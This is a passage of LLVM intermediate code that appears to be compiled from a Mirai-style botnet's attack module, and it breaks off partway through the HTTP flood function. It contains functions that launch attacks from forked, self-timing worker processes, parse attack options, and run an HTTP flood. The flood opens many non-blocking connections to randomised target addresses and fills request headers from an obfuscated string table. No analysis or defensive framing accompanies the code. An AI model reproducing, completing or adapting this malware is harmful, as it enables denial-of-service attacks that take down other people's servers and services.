  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #7
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #7
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #8
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #7
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #7
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #7
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #9
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #7
  %20 = tail call i32 @getppid() #7
  %21 = tail call i32 @kill(i32 %20, i32 9) #7
  tail call void @exit(i32 0) #9
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #7
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #9
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #7
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #7
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #7
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #7
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %9 to %struct.timeval*
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 24, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %1050, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17) #7
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %1050, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16) #7
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %1050, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15) #7
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %1050, label %.preheader597

.preheader597:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15) #7
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph637.preheader, label %._crit_edge638

.lr.ph637.preheader:                              ; preds = %.preheader597
  br label %.lr.ph637

.lr.ph637:                                        ; preds = %.lr.ph637.preheader, %42
  %35 = phi i32 [ %44, %42 ], [ 0, %.lr.ph637.preheader ]
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = load i8, i8* %37, align 1
  %.off586 = add i8 %38, -97
  %39 = icmp ult i8 %.off586, 26
  br i1 %39, label %40, label %42

; <label>:40:                                     ; preds = %.lr.ph637
  %41 = add i8 %38, -32
  store i8 %41, i8* %37, align 1
  %.pre = load i32, i32* %5, align 4
  br label %42

; <label>:42:                                     ; preds = %.lr.ph637, %40
  %43 = phi i32 [ %35, %.lr.ph637 ], [ %.pre, %40 ]
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  %45 = tail call i32 @util_strlen(i8* nonnull %15) #7
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %.lr.ph637, label %._crit_edge638.loopexit

._crit_edge638.loopexit:                          ; preds = %42
  br label %._crit_edge638

._crit_edge638:                                   ; preds = %._crit_edge638.loopexit, %.preheader597
  %47 = icmp slt i32 %18, 256
  %. = select i1 %47, i32 %18, i32 256
  tail call void @table_unlock_val(i8 zeroext 52) #7
  tail call void @table_unlock_val(i8 zeroext 53) #7
  tail call void @table_unlock_val(i8 zeroext 54) #7
  tail call void @table_unlock_val(i8 zeroext 55) #7
  tail call void @table_unlock_val(i8 zeroext 56) #7
  tail call void @table_unlock_val(i8 zeroext 57) #7
  tail call void @table_unlock_val(i8 zeroext 58) #7
  tail call void @table_unlock_val(i8 zeroext 59) #7
  tail call void @table_unlock_val(i8 zeroext 60) #7
  tail call void @table_unlock_val(i8 zeroext 61) #7
  tail call void @table_unlock_val(i8 zeroext 62) #7
  %48 = sext i32 %. to i64
  %49 = tail call noalias i8* @calloc(i64 %48, i64 3140) #7
  %50 = bitcast i8* %49 to %struct.attack_http_state*
  %51 = icmp sgt i32 %18, 0
  br i1 %51, label %.lr.ph636, label %.preheader595

.lr.ph636:                                        ; preds = %._crit_edge638
  %52 = zext i8 %0 to i32
  br label %64

.preheader595.loopexit:                           ; preds = %123
  br label %.preheader595

.preheader595:                                    ; preds = %.preheader595.loopexit, %._crit_edge638
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %10 to i8*
  %56 = bitcast i32* %5 to i8*
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %60 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %61 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %62 = icmp ne i8* %14, null
  %63 = bitcast i32* %12 to i8*
  %.not = icmp slt i32 %18, 1
  br label %.backedge596

; <label>:64:                                     ; preds = %.lr.ph636, %123
  %indvars.iv661 = phi i64 [ 0, %.lr.ph636 ], [ %indvars.iv.next662, %123 ]
  %65 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 1
  store i8 0, i8* %65, align 4
  %66 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 0
  store i32 -1, i32* %66, align 4
  %67 = trunc i64 %indvars.iv661 to i32
  %68 = srem i32 %67, %52
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 4
  store i32 %71, i32* %72, align 4
  %73 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 0
  %74 = tail call i32 @util_strcpy(i8* %73, i8* %17) #7
  %75 = load i8, i8* %73, align 4
  %76 = icmp eq i8 %75, 47
  br i1 %76, label %81, label %77

; <label>:77:                                     ; preds = %64
  %78 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 6, i64 1
  %79 = tail call i32 @util_strlen(i8* %73) #7
  %80 = sext i32 %79 to i64
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %78, i8* %73, i64 %80, i32 1, i1 false)
  store i8 47, i8* %73, align 4
  br label %81

; <label>:81:                                     ; preds = %64, %77
  %82 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 10, i64 0
  %83 = tail call i32 @util_strcpy(i8* %82, i8* %15) #7
  %84 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 9, i64 0
  %85 = tail call i32 @util_strcpy(i8* %84, i8* %15) #7
  %86 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 7, i64 0
  %87 = tail call i32 @util_strcpy(i8* %86, i8* %16) #7
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 2
  %89 = load i8, i8* %88, align 4
  %90 = icmp ult i8 %89, 32
  br i1 %90, label %91, label %100

; <label>:91:                                     ; preds = %81
  %92 = load i32, i32* %70, align 4
  %93 = tail call i32 @ntohl(i32 %92) #8
  %94 = tail call i32 @rand_next() #7
  %95 = load i8, i8* %88, align 4
  %96 = zext i8 %95 to i32
  %97 = lshr i32 %94, %96
  %98 = add i32 %97, %93
  %99 = tail call i32 @htonl(i32 %98) #8
  store i32 %99, i32* %72, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %81
  %101 = tail call i32 @rand_next() #7
  %102 = urem i32 %101, 5
  %trunc = trunc i32 %102 to i3
  switch i3 %trunc, label %123 [
    i3 0, label %103
    i3 1, label %107
    i3 2, label %111
    i3 3, label %115
    i3 -4, label %119
  ]

; <label>:103:                                    ; preds = %100
  tail call void @table_unlock_val(i8 zeroext 63) #7
  %104 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %105 = tail call i8* @table_retrieve_val(i32 63, i32* null) #7
  %106 = tail call i32 @util_strcpy(i8* %104, i8* %105) #7
  tail call void @table_lock_val(i8 zeroext 63) #7
  br label %123

; <label>:107:                                    ; preds = %100
  tail call void @table_unlock_val(i8 zeroext 64) #7
  %108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %109 = tail call i8* @table_retrieve_val(i32 64, i32* null) #7
  %110 = tail call i32 @util_strcpy(i8* %108, i8* %109) #7
  tail call void @table_lock_val(i8 zeroext 64) #7
  br label %123

; <label>:111:                                    ; preds = %100
  tail call void @table_unlock_val(i8 zeroext 65) #7
  %112 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %113 = tail call i8* @table_retrieve_val(i32 65, i32* null) #7
  %114 = tail call i32 @util_strcpy(i8* %112, i8* %113) #7
  tail call void @table_lock_val(i8 zeroext 65) #7
  br label %123

; <label>:115:                                    ; preds = %100
  tail call void @table_unlock_val(i8 zeroext 66) #7
  %116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %117 = tail call i8* @table_retrieve_val(i32 66, i32* null) #7
  %118 = tail call i32 @util_strcpy(i8* %116, i8* %117) #7
  tail call void @table_lock_val(i8 zeroext 66) #7
  br label %123

; <label>:119:                                    ; preds = %100
  tail call void @table_unlock_val(i8 zeroext 67) #7
  %120 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv661, i32 5, i64 0
  %121 = tail call i8* @table_retrieve_val(i32 67, i32* null) #7
  %122 = tail call i32 @util_strcpy(i8* %120, i8* %121) #7
  tail call void @table_lock_val(i8 zeroext 67) #7
  br label %123

; <label>:123:                                    ; preds = %119, %115, %111, %107, %103, %100
  %124 = tail call i32 @util_strcpy(i8* %73, i8* %17) #7
  %indvars.iv.next662 = add nuw nsw i64 %indvars.iv661, 1
  %125 = icmp slt i64 %indvars.iv.next662, %48
  br i1 %125, label %64, label %.preheader595.loopexit

.backedge596.loopexit:                            ; preds = %.loopexit591
  br label %.backedge596.backedge

.backedge596:                                     ; preds = %.backedge596.backedge, %.preheader595
  %126 = call i64 @time(i64* null) #7
  %127 = trunc i64 %126 to i32
  %128 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %53) #7, !srcloc !1
  %129 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %54) #7, !srcloc !2
  br i1 %51, label %.lr.ph615.preheader, label %.backedge596.backedge

.lr.ph615.preheader:                              ; preds = %.backedge596
  br label %.lr.ph615

.lr.ph615:                                        ; preds = %.lr.ph615.preheader, %398
  %indvars.iv = phi i64 [ %indvars.iv.next, %398 ], [ 0, %.lr.ph615.preheader ]
  %.0530612 = phi i32 [ %.1531, %398 ], [ 0, %.lr.ph615.preheader ]
  %130 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv
  %131 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 1
  %132 = load i8, i8* %131, align 4
  %133 = icmp eq i8 %132, 1
  br i1 %133, label %134, label %138

; <label>:134:                                    ; preds = %.lr.ph615
  %135 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 12
  %136 = load i32, i32* %135, align 4
  %137 = icmp ne i32 %136, 0
  %.sink = select i1 %137, i8 4, i8 0
  store i8 %.sink, i8* %131, align 4
  br label %138

; <label>:138:                                    ; preds = %134, %.lr.ph615
  %139 = phi i8 [ %.sink, %134 ], [ %132, %.lr.ph615 ]
  switch i8 %139, label %394 [
    i8 0, label %140
    i8 2, label %172
    i8 4, label %194
    i8 6, label %355
    i8 7, label %368
    i8 10, label %381
  ]

; <label>:140:                                    ; preds = %138
  call void @llvm.memset.p0i8.i64(i8* nonnull %55, i8 0, i64 16, i32 4, i1 false)
  %141 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %142 = load i32, i32* %141, align 4
  %143 = icmp eq i32 %142, -1
  br i1 %143, label %146, label %144

; <label>:144:                                    ; preds = %140
  %145 = call i32 @close(i32 %142) #7
  br label %146

; <label>:146:                                    ; preds = %140, %144
  %147 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %147, i32* %141, align 4
  %148 = icmp eq i32 %147, -1
  br i1 %148, label %398, label %149

; <label>:149:                                    ; preds = %146
  %150 = call i32 (i32, i32, ...) @fcntl(i32 %147, i32 3, i32 0) #7
  %151 = or i32 %150, 2048
  %152 = call i32 (i32, i32, ...) @fcntl(i32 %147, i32 4, i32 %151) #7
  store i32 65535, i32* %5, align 4
  %153 = load i32, i32* %141, align 4
  %154 = call i32 @setsockopt(i32 %153, i32 0, i32 8, i8* nonnull %56, i32 4) #7
  store i16 2, i16* %57, align 4
  %155 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 4
  %156 = load i32, i32* %155, align 4
  store i32 %156, i32* %58, align 4
  %157 = call zeroext i16 @htons(i16 zeroext %20) #8
  store i16 %157, i16* %59, align 2
  %158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  store i32 %127, i32* %158, align 4
  store i8 2, i8* %131, align 4
  %159 = load i32, i32* %141, align 4
  %160 = call i32 @connect(i32 %159, %struct.sockaddr* nonnull %60, i32 16) #7
  %161 = load i32, i32* %141, align 4
  %162 = srem i32 %161, 64
  %163 = zext i32 %162 to i64
  %164 = shl i64 1, %163
  %165 = sdiv i32 %161, 64
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %166
  %168 = load i64, i64* %167, align 8
  %169 = or i64 %164, %168
  store i64 %169, i64* %167, align 8
  %170 = icmp sgt i32 %161, %.0530612
  %171 = add nsw i32 %161, 1
  %..0530 = select i1 %170, i32 %171, i32 %.0530612
  br label %398

; <label>:172:                                    ; preds = %138
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 2
  %174 = load i32, i32* %173, align 4
  %175 = sub i32 %127, %174
  %176 = icmp ugt i32 %175, 30
  br i1 %176, label %177, label %181

; <label>:177:                                    ; preds = %172
  store i8 0, i8* %131, align 4
  %178 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %179 = load i32, i32* %178, align 4
  %180 = call i32 @close(i32 %179) #7
  store i32 -1, i32* %178, align 4
  br label %398

; <label>:181:                                    ; preds = %172
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %130, i64 0, i32 0
  %183 = load i32, i32* %182, align 4
  %184 = srem i32 %183, 64
  %185 = zext i32 %184 to i64
  %186 = shl i64 1, %185
  %187 = sdiv i32 %183, 64
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 %188
  %190 = load i64, i64* %189, align 8
  %191 = or i64 %186, %190
  store i64 %191, i64* %189, align 8
  %192 = icmp sgt i32 %183, %.0530612
  %193 = add nsw i32 %183, 1
  %..0530550 = select i1 %192, i32 %193, i32 %.0530612
  br label %398

; <label>:194:                                    ; preds = %138
  %195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 14
  store i32 -1, i32* %195, align 4
  %196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 11
  store i32 0, i32* %196, align 4
  %197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 18, i64 0
  call void @util_zero(i8* %197, i32 1024) #7
  %198 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 17
  store i32 0, i32* %198, align 4
  call void @util_zero(i8* nonnull %61, i32 10240) #7
  %199 = call i32 @util_strlen(i8* nonnull %61) #7
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %200
  %202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 9, i64 0
  %203 = call i32 @util_strcpy(i8* %201, i8* %202) #7
  %204 = call i32 @util_strlen(i8* nonnull %61) #7
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %205
  %207 = call i32 @util_strcpy(i8* %206, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.32, i64 0, i64 0)) #7
  %208 = call i32 @util_strlen(i8* nonnull %61) #7
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 6, i64 0
  %212 = call i32 @util_strcpy(i8* %210, i8* %211) #7
  %213 = call i32 @util_strlen(i8* nonnull %61) #7
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %214
  %216 = call i32 @util_strcpy(i8* %215, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0)) #7
  %217 = call i32 @util_strlen(i8* nonnull %61) #7
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %218
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 5, i64 0
  %221 = call i32 @util_strcpy(i8* %219, i8* %220) #7
  %222 = call i32 @util_strlen(i8* nonnull %61) #7
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %223
  %225 = call i32 @util_strcpy(i8* %224, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0)) #7
  %226 = call i32 @util_strlen(i8* nonnull %61) #7
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 %227
  %229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv, i32 7, i64 0
  %230 = call i32 @util_strcpy(i8* %228, i8* %229) #7
  %231 = call i32 @util_strlen(i8* nonnull %61) #7
